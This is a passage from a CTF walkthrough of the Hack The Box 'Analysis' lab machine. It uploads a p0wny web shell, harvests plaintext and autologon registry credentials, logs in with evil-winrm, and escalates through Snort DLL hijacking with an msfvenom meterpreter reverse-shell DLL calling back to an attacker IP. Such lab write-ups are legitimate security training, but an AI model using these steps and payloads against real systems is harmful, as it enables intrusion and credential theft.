You can download [p0wny-shell here](https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php) Once downloaded, upload it. and navigate to `http://internal.analysis.htb/dashboard/uploads/shell.php` to access the shell interface.

![12](/assets/img/Analysis/12.webp)

Exploring the file system, I found database credentials under `C:\inetpub\internal\employee\login.php`

```bash
DC-ANALYSIS$@DC-ANALYSIS:C:\inetpub\internal\employees# type login.php
 $host = "localhost";
 $username = "db_master";
 $password = '0$TBO7H8s12yh&';
 $database = "employees";
```

- I asked chatgpt - `ctf windows env where most likely the creds are`

![13](/assets/img/Analysis/13.webp)

- Credentials found in the registry - `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
- User `jdoe:7y4Z4^*y9Zzj`

```bash
DC-ANALYSIS$@DC-ANALYSIS:C:\# reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon
    AutoRestartShell    REG_DWORD    0x1
    Background    REG_SZ    0 0 0
    CachedLogonsCount    REG_SZ    10
    DebugServerCommand    REG_SZ    no
    DefaultDomainName    REG_SZ    analysis.htb.
    DefaultUserName    REG_SZ    jdoe
    DisableBackButton    REG_DWORD    0x1
    EnableSIHostIntegration    REG_DWORD    0x1
    ForceUnlockLogon    REG_DWORD    0x0
    LegalNoticeCaption    REG_SZ
    LegalNoticeText    REG_SZ
    PasswordExpiryWarning    REG_DWORD    0x5
    PowerdownAfterShutdown    REG_SZ    0
    PreCreateKnownFolders    REG_SZ    {A520A1A4-1780-4FF6-BD18-167343C5AF16}
    ReportBootOk    REG_SZ    1
    Shell    REG_SZ    explorer.exe
    ShellCritical    REG_DWORD    0x0
    ShellInfrastructure    REG_SZ    sihost.exe
    SiHostCritical    REG_DWORD    0x0
    SiHostReadyTimeOut    REG_DWORD    0x0
    SiHostRestartCountLimit    REG_DWORD    0x0
    SiHostRestartTimeGap    REG_DWORD    0x0
    Userinit    REG_SZ    C:\Windows\system32\userinit.exe,
    VMApplet    REG_SZ    SystemPropertiesPerformance.exe /pagefile
    WinStationsDisabled    REG_SZ    0
    ShellAppRuntime    REG_SZ    ShellAppRuntime.exe
    scremoveoption    REG_SZ    0
    DisableCAD    REG_DWORD    0x1
    LastLogOffEndTimePerfCounter    REG_QWORD    0x1ab910533
    ShutdownFlags    REG_DWORD    0x13
    DisableLockWorkstation    REG_DWORD    0x0
    AutoAdminLogon    REG_SZ    1
    DefaultPassword    REG_SZ    7y4Z4^*y9Zzj
    AutoLogonSID    REG_SZ    S-1-5-21-916175351-3772503854-3498620144-1103
    LastUsedUsername    REG_SZ    jdoe

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AlternateShells
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\GPExtensions
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\UserDefaults
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\AutoLogonChecked
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\VolatileUserMgrKey
```

## Shell as jdoe
- I am able to log in via `evil-winrm` with these credentials, gaining a shell as `jdoe`.

```bash
$ evil-winrm -i 10.10.11.250 -u jdoe -p '7y4Z4^*y9Zzj'

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
 
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\jdoe\Documents> 
```

#### User.txt

- Got the user.txt

```bash
*Evil-WinRM* PS C:\Users\jdoe> cd Desktop
*Evil-WinRM* PS C:\Users\jdoe\Desktop> ls
Directory: C:\Users\jdoe\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         6/1/2024   3:23 AM             34 user.txt

Evil-WinRM* PS C:\Users\jdoe\Desktop> type user.txt
c44ed46*************************
```

##### user.txt

```text
c44ed46*************************
```

### Enumerating for Privilege escalation 

After some manual enumeration, I uploaded and ran `winpeas64.exe`
- Another credential was found: `webservice:N1G6G46G@G!j`

```bash
Found Misc-Code asigning passwords Regexes                                                                                  
C:\inetpub\internal\users\list.php: password = 'N1G6G46G@G!j'; 
C:\inetpub\internal\users\list.php: password = substr($_GET["name"], $start, $end - $start);
Found Misc-Simple Passwords Regexes                                                                                         
C:\inetpub\internal\users\list.php: password = 'N1G6G46G@G!j'; 
C:\inetpub\internal\users\list.php: password = substr($_GET["name"], $start, $end - $start);
Found Misc-Usernames Regexes
C:\inetpub\internal\users\list.php: username = 'webservice@analysis.htb';
```

- winpeas64 identified several potential privilege escalation vectors, but DLL Hijacking seemed interesting. Googling for Snort DLL Hijacking led me to the [Snort 2.9.7.0-WIN32 DLL Hijacking](https://packetstormsecurity.com/files/138915/Snort-2.9.7.0-WIN32-DLL-Hijacking.html) - CVE-2016-1417

```bash
=================================================================================================
Snort(Snort)[C:\Snort\bin\snort.exe /SERVICE] - Autoload - No quotes and Space detected
Possible DLL Hijacking in binary folder: C:\Snort\bin (Users [AppendData/CreateDirectories WriteData/CreateFiles])
=================================================================================================
```

### Snort DLL Hijacking Steps
Following the steps from the article:

- Create an empty file on a remote directory share with a .pcap extension.
- Place an arbitrary DLL named "tcapi.dll" in the remote share.
- Open the file with snort.exe.

These steps did not work for me.

#### Enumerating Snort
- Found the `snort.conf` file under `C:\Snort\etc`

```bash
*Evil-WinRM* PS C:\Snort\etc> ls

Directory: C:\Snort\etc

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        4/20/2022   4:15 PM           3757 classification.config
-a----        4/20/2022   4:15 PM          23654 file_magic.conf
-a----        4/20/2022   4:15 PM          33339 gen-msg.map
-a----        4/20/2022   4:15 PM            687 reference.config
-a----         7/8/2023   9:34 PM          23094 snort.conf
-a----        4/20/2022   4:15 PM           2335 threshold.conf
-a----        4/20/2022   4:15 PM         160606 unicode.map
```

- I think the DLL is loaded from `C:\Snort\lib\snort_dynamicpreprocessor\`

```text
###################################################
# Step #4: Configure dynamic loaded libraries.
# For more information, see Snort Manual, Configuring Snort - Dynamic Modules
###################################################

# path to dynamic preprocessor libraries
dynamicpreprocessor directory C:\Snort\lib\snort_dynamicpreprocessor 

# path to base preprocessor engine 
dynamicengine C:\Snort\lib\snort_dynamicengine\sf_engine.dll

# path to dynamic rules libraries
# dynamicdetection directory C:\Snort\lib\snort_dynamicrules

###################################################
# Step #5: Configure preprocessors 
# For more information, see the Snort Manual, Configuring Snort - Preprocessors
###################################################
```

### Root.txt

- Created the DLL with `msfvenom`

```bash
msfvenom -a x64 --platform windows -p windows/x64/meterpreter/reverse_tcp lhost=10.10.14.18 lport=1337 -f dll -o sf_engine.dll
```

- Uploaded the `sf_engine.dll` to `C:\Snort\lib\snort_dynamicpreprocessor`
- Opened the meterpreter session

```bash
msf6 > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost tun0
lhost => tun0
msf6 exploit(multi/handler) > set lport 1337
lport => 1337
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.18:1337 

```

- Got a Meterpreter session as `analysis\administrateur`

```bash
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.18:1337 
[*] Sending stage (201798 bytes) to 10.10.11.250
[*] Meterpreter session 1 opened (10.10.14.18:1337 -> 10.10.11.250:54518) at 2024-06-01 16:26:29 +1000

meterpreter > shell
Process 11424 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.5329]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
analysis\administrateur
C:\Users\Administrateur\Desktop>type root.txt
type root.txt
6007de3*************************
```

##### root.txt
Got the root.txt
```text
6007de3*************************
```

